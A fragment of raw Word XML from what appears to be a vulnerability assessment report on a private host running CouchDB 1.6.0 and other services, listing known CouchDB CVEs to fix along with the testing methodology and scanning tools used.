          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Network infrastructure:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C01D22">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="445F4F01" wp14:editId="1766C2CA">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>right</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>499564</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="2212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anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The example.com is located in the private network 10.10.10.0/24 with the IP address 10.10.10.10 or with DNS example.com. There are some services that run on the instance:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>- FTP service runs on port 21</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>- SSH enabled</w:t>
      </w:r>
      <w:r w:rsidR="00BA78CE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> runs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on port 22</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>- DNS resolver</w:t>
      </w:r>
      <w:r w:rsidR="00BA78CE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> runs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on port 53</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="00BA78CE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Web application runs on port 80 (Port 443 is open but currently unused)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00BA78CE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">- Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> service runs on port 5984</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00BA78CE">
      <w:pPr>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Vesta</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> service runs on port 8083</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C01D22" w:rsidRDefault="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Security Control:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00C01D22" w:rsidP="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The instance </w:t>
      </w:r>
      <w:r w:rsidR="00BA78CE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>has no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> firewall or HTTPS enabled for the web application, even though</w:t>
      </w:r>
      <w:r w:rsidR="00BA78CE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">it has an open port 443 for HTTPS. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00BA78CE" w:rsidP="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00BA78CE" w:rsidP="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> service runs on port 5984 allows for all users even non-admin users which creates critical vulnerabilities for the system. Also, there are vulnerabilities with the current version of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (1.6.0) which allow non-admin users to execute code and gain privileges.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00BA78CE" w:rsidP="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00BA78CE" w:rsidP="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>These are the critical</w:t>
      </w:r>
      <w:r w:rsidR="00382420">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/high</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerabilities related to Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> need to quickly plan to fix to avoid the great potential of damage.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00BA78CE" w:rsidP="00382420">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00382420">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CVE-2022-24706</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC2939" w:rsidRPr="00DC2939" w:rsidRDefault="00DC2939" w:rsidP="00DC2939">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC2939">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC2939">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC2939">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unauthenticated Administrative Access</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00BA78CE" w:rsidP="00BA78CE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA78CE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CVE-2017-12635</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRPr="00BA78CE" w:rsidRDefault="00BA78CE" w:rsidP="00BA78CE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA78CE">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>CVE-2017-12636</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BA78CE" w:rsidRDefault="00BA78CE" w:rsidP="00C01D22">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000B2919" w:rsidRPr="000B2919" w:rsidRDefault="00EF7202" w:rsidP="00EF7202">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000B2919">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EF7202" w:rsidRDefault="00EF7202" w:rsidP="00EF7202">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9" w:name="_Toc143392736"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Testing Methodology</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w:rsidR="00EF7202" w:rsidRPr="00EF7202" w:rsidRDefault="00EF7202" w:rsidP="00EF7202">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EF7202" w:rsidRPr="000B2919" w:rsidRDefault="00EF7202" w:rsidP="00EF7202">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Automation scan follows policy-ns-q3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EF7202" w:rsidRPr="000B2919" w:rsidRDefault="00EF7202" w:rsidP="00EF7202">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Manual testing follows policy-va-q3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EF7202" w:rsidRPr="00BB2124" w:rsidRDefault="00EF7202" w:rsidP="00EF7202">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Web vulnerability assessment and audit</w:t>
      </w:r>
      <w:r w:rsidRPr="000B2919">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EF7202" w:rsidRPr="000B2919" w:rsidRDefault="00EF7202" w:rsidP="00EF7202">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CVE Analysis and research</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000B2919" w:rsidRPr="00EF7202" w:rsidRDefault="000B2919" w:rsidP="00EF7202">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:spacing w:after="240"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875"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10" w:name="_Toc143392737"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Tools &amp; Websites Used</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRPr="000B2919" w:rsidRDefault="000B2919" w:rsidP="000B2919">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000B2919">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BB2124">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="Verdana" w:hAnsi="Verdana" w:cs="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Nessus Essential</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000B2919" w:rsidRPr="000B2919" w:rsidRDefault="000B2919">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Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BB2124">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Faraday</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB2124" w:rsidRPr="00BB2124" w:rsidRDefault="000B2919" w:rsidP="00BB2124">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0B2919">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00BB2124">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cURL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="000B2919" w:rsidRPr="000B2919" w:rsidRDefault="00C95900" w:rsidP="00C95900">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sidRPr="00C95900">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Verdana" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>https://www.cvedetails.com</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00EF7202">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:pBdr>
